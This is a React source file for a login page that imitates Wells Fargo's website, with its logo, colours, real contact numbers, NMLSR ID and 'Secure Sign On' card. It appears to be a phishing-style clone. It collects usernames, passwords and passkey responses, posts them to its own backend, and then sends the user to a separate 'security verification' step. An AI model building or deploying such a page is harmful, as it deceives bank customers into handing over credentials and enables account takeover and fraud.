import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useMutation } from "@tanstack/react-query";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent } from "@/components/ui/card";
import { Checkbox } from "@/components/ui/checkbox";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormMessage,
} from "@/components/ui/form";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { 
  Search, Shield, MapPin, Phone, MessageCircle, Globe, 
  ChevronDown, Lock, X, CreditCard, Home, PiggyBank, Car, 
  Smartphone, Menu, Key, Fingerprint, Building2, Users,
  TrendingUp, ArrowRight, CheckCircle2, HelpCircle, User
} from "lucide-react";
import { Link, useLocation } from "wouter";
import { WellsFargoIcon } from "@/components/wells-fargo-logo";

const loginSchema = z.object({
  username: z.string().min(1, "Username is required"),
  password: z.string().min(1, "Password is required"),
  saveUsername: z.boolean().default(false),
});

type LoginFormData = z.infer<typeof loginSchema>;

function MobileMenu() {
  const [isOpen, setIsOpen] = useState(false);
  return (
    <>
      <button 
        className="lg:hidden text-white p-2 hover:bg-white/10 rounded"
        onClick={() => setIsOpen(!isOpen)}
        data-testid="button-mobile-menu"
      >
        <Menu className="w-6 h-6" />
      </button>
      {isOpen && (
        <div className="lg:hidden absolute top-full left-0 right-0 bg-white shadow-lg z-50 border-t">
          <nav className="p-4 space-y-3">
            <a href="#" className="block py-2 text-gray-700 border-b">Personal</a>
            <a href="#" className="block py-2 text-gray-700 border-b">Small Business</a>
            <a href="#" className="block py-2 text-gray-700 border-b">Wealth Management</a>
            <a href="#" className="block py-2 text-gray-700">Commercial</a>
          </nav>
        </div>
      )}
    </>
  );
}

function getGreeting() {
  const hour = new Date().getHours();
  if (hour < 12) return "Good morning";
  if (hour < 17) return "Good afternoon";
  return "Good evening";
}

export default function LoginPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [greeting, setGreeting] = useState(getGreeting());
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const [biometricSupported, setBiometricSupported] = useState(false);
  const [biometricLoading, setBiometricLoading] = useState(false);

  useEffect(() => {
    const checkBiometric = async () => {
      if (window.PublicKeyCredential) {
        try {
          const available = await window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable();
          setBiometricSupported(available);
        } catch {
          setBiometricSupported(false);
        }
      }
    };
    checkBiometric();
  }, []);

  const handleBiometricLogin = async () => {
    setBiometricLoading(true);
    try {
      const challengeRes = await fetch("/api/auth/biometric/challenge", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "authenticate" }),
      });
      
      if (!challengeRes.ok) throw new Error("Failed to get challenge");
      
      const { challenge, rpId, allowCredentials } = await challengeRes.json();
      
      const credential = await navigator.credentials.get({
        publicKey: {
          challenge: Uint8Array.from(atob(challenge), c => c.charCodeAt(0)),
          rpId: rpId || window.location.hostname,
          allowCredentials: allowCredentials?.map((id: string) => ({
            id: Uint8Array.from(atob(id), c => c.charCodeAt(0)),
            type: "public-key" as const,
          })) || [],
          userVerification: "preferred",
          timeout: 60000,
        },
      }) as PublicKeyCredential;

      if (credential) {
        const authRes = await fetch("/api/auth/biometric/authenticate", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            credentialId: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array((credential as any).rawId)))),
            signature: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array((credential.response as any).signature)))),
            authenticatorData: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array((credential.response as any).authenticatorData)))),
            clientDataJSON: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(credential.response.clientDataJSON)))),
          }),
        });

        if (authRes.ok) {
          toast({
            title: "Biometric Sign On Successful",
            description: "Redirecting to verification...",
          });
          sessionStorage.setItem("loginUsername", "biometric_user");
          setTimeout(() => setLocation("/verify"), 1000);
        }
      }
    } catch (error: any) {
      toast({
        title: "Biometric Sign On Failed",
        description: error.name === "NotAllowedError" 
          ? "Biometric authentication was cancelled or not available."
          : "Please try again or use your username and password.",
        variant: "destructive",
      });
    } finally {
      setBiometricLoading(false);
    }
  };

  const form = useForm<LoginFormData>({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      username: "",
      password: "",
      saveUsername: false,
    },
  });

  const usernameValue = form.watch("username");

  const loginMutation = useMutation({
    mutationFn: async (data: LoginFormData) => {
      const response = await apiRequest("POST", "/api/auth/login", {
        username: data.username,
        password: data.password,
      });
      return response;
    },
    onSuccess: (_, variables) => {
      sessionStorage.setItem("loginUsername", variables.username);
      toast({
        title: "Sign On Successful",
        description: "Please complete security verification...",
      });
      setTimeout(() => {
        setLocation("/verify");
      }, 1000);
    },
    onError: (error: Error) => {
      toast({
        title: "Sign On Failed",
        description: error.message || "Invalid username or password",
        variant: "destructive",
      });
    },
  });

  const onSubmit = (data: LoginFormData) => {
    loginMutation.mutate(data);
  };

  const clearUsername = () => {
    form.setValue("username", "");
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#fafafa]">
      <a href="#main-content" className="sr-only focus:not-sr-only focus:absolute focus:top-0 focus:left-0 bg-[#cd1409] text-white p-2 z-50">
        Skip to main content
      </a>

      {/* Top utility bar */}
      <div className="bg-[#1a1a1a] text-white text-[13px]">
        <div className="max-w-[1280px] mx-auto px-4">
          <div className="flex items-center justify-between py-[10px]">
            <div className="flex items-center gap-6">
              <a href="#" className="hover:underline flex items-center gap-1.5 text-[#d4d4d4] hover:text-white transition-colors" data-testid="link-locations">
                <MapPin className="w-4 h-4" />
                <span>Locations</span>
              </a>
              <a href="tel:1-800-869-3557" className="hover:underline flex items-center gap-1.5 text-[#d4d4d4] hover:text-white transition-colors" data-testid="link-contact">
                <Phone className="w-4 h-4" />
                <span>1-800-TO-WELLS</span>
              </a>
              <a href="sms:93557" className="hover:underline flex items-center gap-1.5 text-[#d4d4d4] hover:text-white transition-colors hidden md:flex" data-testid="link-text">
                <MessageCircle className="w-4 h-4" />
                <span>Text HELP to 93557</span>
              </a>
            </div>
            <div className="flex items-center gap-6">
              <a href="#" className="hover:underline flex items-center gap-1.5 text-[#d4d4d4] hover:text-white transition-colors" data-testid="link-espanol">
                <Globe className="w-4 h-4" />
                <span>En Español</span>
              </a>
              <a href="#" className="hover:underline text-[#d4d4d4] hover:text-white transition-colors hidden md:inline" data-testid="link-help">
                Contact Us
              </a>
            </div>
          </div>
        </div>
      </div>

      {/* Main header */}
      <header className="bg-[#cd1409]">
        <div className="max-w-[1280px] mx-auto px-4">
          <div className="flex items-center justify-between py-4">
            <div className="flex items-center gap-3" data-testid="logo-container">
              <Link href="/">
                <div className="flex items-center gap-2.5 cursor-pointer">
                  <WellsFargoIcon className="w-10 h-10" />
                  <span 
                    className="text-white text-[26px] tracking-[0.02em]"
                    style={{ fontFamily: "Georgia, 'Times New Roman', serif" }}
                    data-testid="text-logo"
                  >
                    WELLS FARGO
                  </span>
                </div>
              </Link>
            </div>

            <div className="flex items-center gap-4">
              <div className="relative hidden lg:block">
                <Input
                  placeholder="Search wellsfargo.com"
                  className="w-64 h-10 bg-white border-0 text-gray-800 placeholder:text-gray-500 text-sm rounded pr-12"
                  data-testid="input-search"
                />
                <button className="absolute right-0 top-0 h-full px-4 bg-[#a81106] hover:bg-[#8a0e05] transition-colors rounded-r">
                  <Search className="w-4 h-4 text-white" />
                </button>
              </div>
              <button className="lg:hidden text-white p-2 hover:bg-white/10 rounded">
                <Search className="w-5 h-5" />
              </button>
              <MobileMenu />
            </div>
          </div>
        </div>

        {/* Primary Navigation */}
        <nav className="bg-[#b81208] border-t border-[#a81106]">
          <div className="max-w-[1280px] mx-auto px-4">
            <div className="flex items-center justify-between">
              <div className="flex items-center">
                {[
                  { name: "Personal", active: true },
                  { name: "Small Business" },
                  { name: "Commercial Banking" },
                  { name: "Corporate & Investment Banking" },
                ].map((item) => (
                  <button
                    key={item.name}
                    className={`px-5 py-4 text-[14px] text-white whitespace-nowrap flex items-center gap-1.5 transition-colors font-medium ${
                      item.active 
                        ? "bg-[#9a0f06] border-b-[3px] border-[#ffcd41]" 
                        : "hover:bg-[#a81106] border-b-[3px] border-transparent"
                    }`}
                    data-testid={`nav-${item.name.toLowerCase().replace(/ /g, "-")}`}
                  >
                    {item.name}
                    <ChevronDown className="w-3.5 h-3.5 opacity-80" />
                  </button>
                ))}
              </div>
              <div className="hidden lg:flex items-center gap-6 pr-2">
                <a href="#" className="text-white/90 text-sm hover:text-white flex items-center gap-2 transition-colors">
                  <Smartphone className="w-4 h-4" />
                  Get the App
                </a>
              </div>
            </div>
          </div>
        </nav>

        {/* Secondary Navigation */}
        <div className="bg-[#9a0f06]">
          <div className="max-w-[1280px] mx-auto px-4">
            <div className="flex items-center gap-8 py-3 overflow-x-auto">
              {[
                "Checking",
                "Savings & CDs", 
                "Credit Cards",
                "Home Loans",
                "Personal Loans",
                "Auto",
                "Invest",
                "Rewards"
              ].map((item) => (
                <a
                  key={item}
                  href="#"
                  className="text-white/85 hover:text-white text-[13px] whitespace-nowrap transition-colors"
                  data-testid={`subnav-${item.toLowerCase().replace(/ /g, "-")}`}
                >
                  {item}
                </a>
              ))}
            </div>
          </div>
        </div>
      </header>

      {/* Yellow accent bar */}
      <div className="bg-gradient-to-r from-[#ffcd41] via-[#ffd44f] to-[#ffcd41] h-[6px]"></div>

      {/* Main Content */}
      <main id="main-content" className="flex-1">
        {/* Hero Section */}
        <div 
          className="relative py-12 lg:py-16"
          style={{
            background: "linear-gradient(135deg, #1a365d 0%, #2c5282 50%, #1a365d 100%)"
          }}
        >
          <div className="absolute inset-0 opacity-10" style={{
            backgroundImage: "url(\"data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.4'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E\")"
          }}></div>
          
          <div className="max-w-[1280px] mx-auto px-4">
            <div className="grid lg:grid-cols-5 gap-8 items-start">
              {/* Sign On Card */}
              <div className="lg:col-span-2">
                <Card className="shadow-2xl border-0 overflow-hidden" data-testid="card-login">
                  <div className="bg-gradient-to-r from-[#cd1409] to-[#b81208] px-6 py-4">
                    <h2 className="text-white text-lg font-semibold flex items-center gap-2">
                      <Lock className="w-5 h-5" />
                      Secure Sign On
                    </h2>
                  </div>
                  <CardContent className="p-6 bg-white">
                    <Form {...form}>
                      <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
                        <FormField
                          control={form.control}
                          name="username"
                          render={({ field }) => (
                            <FormItem>
                              <FormControl>
                                <div className="relative">
                                  <Input
                                    placeholder="Username"
                                    className="h-12 pr-10 border-gray-300 rounded text-base focus:border-[#cd1409] focus:ring-[#cd1409] bg-[#fafafa]"
                                    data-testid="input-username"
                                    {...field}
                                  />
                                  {usernameValue && (
                                    <button
                                      type="button"
                                      onClick={clearUsername}
                                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                                      data-testid="button-clear-username"
                                    >
                                      <X className="w-5 h-5" />
                                    </button>
                                  )}
                                </div>
                              </FormControl>
                              <FormMessage />
                            </FormItem>
                          )}
                        />

                        <FormField
                          control={form.control}
                          name="password"
                          render={({ field }) => (
                            <FormItem>
                              <FormControl>
                                <div className="relative">
                                  <Input
                                    type={showPassword ? "text" : "password"}
                                    placeholder="Password"
                                    className="h-12 pr-16 border-gray-300 rounded text-base focus:border-[#cd1409] focus:ring-[#cd1409] bg-[#fafafa]"
                                    data-testid="input-password"
                                    {...field}
                                  />
                                  <button
                                    type="button"
                                    onClick={() => setShowPassword(!showPassword)}
                                    className="absolute right-3 top-1/2 -translate-y-1/2 text-[#cd1409] text-sm font-semibold hover:underline"
                                    data-testid="button-toggle-password"
                                  >
                                    {showPassword ? "Hide" : "Show"}
                                  </button>
                                </div>
                              </FormControl>
                              <FormMessage />
                            </FormItem>
                          )}
                        />

                        <FormField
                          control={form.control}
                          name="saveUsername"
                          render={({ field }) => (
                            <FormItem>
                              <div className="flex items-center gap-2">
                                <FormControl>
                                  <Checkbox
                                    checked={field.value}
                                    onCheckedChange={field.onChange}
                                    className="border-gray-400 data-[state=checked]:bg-[#cd1409] data-[state=checked]:border-[#cd1409]"
                                    data-testid="checkbox-save-username"
                                  />
                                </FormControl>
                                <label className="text-sm text-gray-700 cursor-pointer select-none">
                                  Save username
                                </label>
                              </div>
                            </FormItem>
                          )}
                        />

                        <Button
                          type="submit"
                          className="w-full h-12 bg-[#ffcd41] hover:bg-[#e6b938] text-[#1a1a1a] font-bold rounded-full text-base shadow-md transition-all hover:shadow-lg"
                          disabled={loginMutation.isPending}
                          data-testid="button-sign-on"
                        >
                          {loginMutation.isPending ? "Signing On..." : "Sign On"}
                        </Button>

                        <div className="relative py-2">
                          <div className="absolute inset-0 flex items-center">
                            <div className="w-full border-t border-gray-200"></div>
                          </div>
                          <div className="relative flex justify-center text-xs">
                            <span className="bg-white px-3 text-gray-500 uppercase tracking-wider">or sign on with</span>
                          </div>
                        </div>

                        <Button
                          type="button"
                          variant="outline"
                          className="w-full h-11 rounded-full border-2 border-[#1a1a1a] text-[#1a1a1a] font-semibold hover:bg-gray-50 text-sm"
                          data-testid="button-passkey"
                          onClick={handleBiometricLogin}
                          disabled={biometricLoading}
                        >
                          <Key className="w-4 h-4 mr-2" />
                          {biometricLoading ? "Authenticating..." : "Use a Passkey"}
                        </Button>

                        {biometricSupported && (
                          <Button
                            type="button"
                            variant="outline"
                            className="w-full h-11 rounded-full border-2 border-[#cd1409] text-[#cd1409] font-semibold hover:bg-red-50 text-sm"
                            data-testid="button-biometric"
                            onClick={handleBiometricLogin}
                            disabled={biometricLoading}
                          >
                            <Fingerprint className="w-4 h-4 mr-2" />
                            {biometricLoading ? "Verifying..." : "Face ID / Touch ID"}
                          </Button>
                        )}
                      </form>
                    </Form>

                    <div className="mt-5 text-center">
                      <Link href="/forgot-password" className="text-[#cd1409] text-sm font-medium hover:underline" data-testid="link-forgot">
                        Forgot username or password?
                      </Link>
                    </div>

                    <div className="mt-5 pt-5 border-t border-gray-200">
                      <div className="flex items-center justify-between">
                        <span className="text-sm text-gray-600">New to Wells Fargo Online?</span>
                        <Link href="/register" className="text-[#cd1409] text-sm font-bold hover:underline flex items-center gap-1" data-testid="link-register">
                          Enroll Now
                          <ArrowRight className="w-4 h-4" />
                        </Link>
                      </div>
                    </div>

                    <div className="mt-5 pt-4 border-t border-gray-100 flex items-center justify-center gap-3 text-xs text-gray-500">
                      <Shield className="w-4 h-4 text-green-600" />
                      <span>Protected by 256-bit encryption</span>
                      <Lock className="w-3.5 h-3.5 text-green-600" />
                    </div>
                  </CardContent>
                </Card>
              </div>

              {/* Hero Content */}
              <div className="lg:col-span-3 text-white">
                <div className="mb-8">
                  <p className="text-[#ffcd41] text-sm font-semibold uppercase tracking-wider mb-2">Welcome Back</p>
                  <h1 className="text-3xl lg:text-4xl font-light mb-4" style={{ fontFamily: "Georgia, serif" }}>
                    {greeting}
                  </h1>
                  <p className="text-white/80 text-lg max-w-xl">
                    Manage your accounts, pay bills, transfer money, and more — all from one secure location.
                  </p>
                </div>

                <div className="grid sm:grid-cols-2 gap-4 mb-8">
                  {[
                    { icon: CreditCard, title: "Credit Cards", desc: "Earn rewards on every purchase" },
                    { icon: Home, title: "Home Loans", desc: "Find your perfect mortgage" },
                    { icon: PiggyBank, title: "Savings", desc: "Grow your money faster" },
                    { icon: TrendingUp, title: "Investing", desc: "Build your future wealth" },
                  ].map((item) => (
                    <Card key={item.title} className="bg-white/10 backdrop-blur border-white/20 hover:bg-white/15 transition-all cursor-pointer group">
                      <CardContent className="p-4 flex items-center gap-4">
                        <div className="w-12 h-12 bg-[#ffcd41] rounded-lg flex items-center justify-center flex-shrink-0">
                          <item.icon className="w-6 h-6 text-[#1a1a1a]" />
                        </div>
                        <div>
                          <h3 className="font-semibold text-white">{item.title}</h3>
                          <p className="text-sm text-white/70">{item.desc}</p>
                        </div>
                      </CardContent>
                    </Card>
                  ))}
                </div>

                <div className="flex flex-wrap gap-4">
                  <div className="flex items-center gap-2 text-white/80 text-sm">
                    <CheckCircle2 className="w-5 h-5 text-[#ffcd41]" />
                    <span>FDIC Insured</span>
                  </div>
                  <div className="flex items-center gap-2 text-white/80 text-sm">
                    <CheckCircle2 className="w-5 h-5 text-[#ffcd41]" />
                    <span>24/7 Fraud Monitoring</span>
                  </div>
                  <div className="flex items-center gap-2 text-white/80 text-sm">
                    <CheckCircle2 className="w-5 h-5 text-[#ffcd41]" />
                    <span>Zero Liability Protection</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Features Section */}
        <div className="bg-white py-12 border-b">
          <div className="max-w-[1280px] mx-auto px-4">
            <div className="text-center mb-10">
              <h2 className="text-2xl font-light text-gray-900 mb-2" style={{ fontFamily: "Georgia, serif" }}>
                Banking Made Simple
              </h2>
              <p className="text-gray-600">Everything you need to manage your money in one place</p>
            </div>
            <div className="grid md:grid-cols-4 gap-8">
              {[
                { icon: Smartphone, title: "Mobile Banking", desc: "Bank anywhere with our award-winning app" },
                { icon: Shield, title: "Security Guarantee", desc: "Your accounts are protected 24/7" },
                { icon: Users, title: "Expert Support", desc: "Get help from our dedicated team" },
                { icon: TrendingUp, title: "Financial Tools", desc: "Track spending and reach your goals" },
              ].map((feature) => (
                <div key={feature.title} className="text-center">
                  <div className="w-16 h-16 mx-auto bg-[#fef3f3] rounded-full flex items-center justify-center mb-4">
                    <feature.icon className="w-8 h-8 text-[#cd1409]" />
                  </div>
                  <h3 className="font-semibold text-gray-900 mb-2">{feature.title}</h3>
                  <p className="text-sm text-gray-600">{feature.desc}</p>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* Promo Banner */}
        <div className="bg-[#f5f5f5] py-8">
          <div className="max-w-[1280px] mx-auto px-4">
            <div className="bg-white rounded-lg shadow-sm p-6 flex flex-col md:flex-row items-center justify-between gap-4">
              <div className="flex items-center gap-4">
                <div className="w-14 h-14 bg-[#cd1409] rounded-full flex items-center justify-center">
                  <CreditCard className="w-7 h-7 text-white" />
                </div>
                <div>
                  <p className="text-[#cd1409] text-xs font-bold uppercase tracking-wider">Limited Time Offer</p>
                  <h3 className="text-lg font-semibold text-gray-900">Earn $200 cash back with Active Cash Card</h3>
                  <p className="text-sm text-gray-600">Unlimited 2% cash rewards on purchases. No annual fee.</p>
                </div>
              </div>
              <Button className="bg-[#cd1409] hover:bg-[#b81208] text-white px-8 rounded-full font-semibold">
                Apply Now
              </Button>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#1a1a1a] text-white">
        <div className="max-w-[1280px] mx-auto px-4 py-10">
          <div className="grid md:grid-cols-4 gap-8 mb-8">
            <div>
              <h4 className="font-semibold mb-4 text-[#ffcd41]">Products & Services</h4>
              <ul className="space-y-2 text-sm text-gray-400">
                <li><a href="#" className="hover:text-white transition-colors">Checking Accounts</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Savings Accounts</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Credit Cards</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Home Mortgages</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Auto Loans</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-semibold mb-4 text-[#ffcd41]">Resources</h4>
              <ul className="space-y-2 text-sm text-gray-400">
                <li><a href="#" className="hover:text-white transition-colors">Financial Education</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Calculators</a></li>
                <li><a href="#" className="hover:text-white transition-colors">FAQs</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Security Center</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Fraud Prevention</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-semibold mb-4 text-[#ffcd41]">About Us</h4>
              <ul className="space-y-2 text-sm text-gray-400">
                <li><a href="#" className="hover:text-white transition-colors">Company Info</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Investor Relations</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Careers</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Diversity & Inclusion</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Community</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-semibold mb-4 text-[#ffcd41]">Contact Us</h4>
              <ul className="space-y-2 text-sm text-gray-400">
                <li className="flex items-center gap-2">
                  <Phone className="w-4 h-4" />
                  1-800-TO-WELLS
                </li>
                <li><a href="#" className="hover:text-white transition-colors">Find a Location</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Schedule Appointment</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Send a Message</a></li>
              </ul>
            </div>
          </div>
          
          <div className="border-t border-gray-800 pt-6">
            <div className="flex flex-col md:flex-row items-center justify-between gap-4">
              <div className="flex items-center gap-2">
                <WellsFargoIcon className="w-8 h-8" />
                <span className="text-lg" style={{ fontFamily: "Georgia, serif" }}>WELLS FARGO</span>
              </div>
              <div className="flex flex-wrap items-center gap-4 text-xs text-gray-500">
                <a href="#" className="hover:text-white">Privacy Policy</a>
                <span>|</span>
                <a href="#" className="hover:text-white">Terms of Use</a>
                <span>|</span>
                <a href="#" className="hover:text-white">Security</a>
                <span>|</span>
                <a href="#" className="hover:text-white">Report Fraud</a>
              </div>
            </div>
            <p className="text-xs text-gray-500 mt-4 text-center md:text-left">
              © 2024 Wells Fargo. All rights reserved. NMLSR ID 399801
            </p>
            <p className="text-xs text-gray-600 mt-2 text-center md:text-left">
              Member FDIC. Equal Housing Lender.
            </p>
          </div>
        </div>
      </footer>
    </div>
  );
}
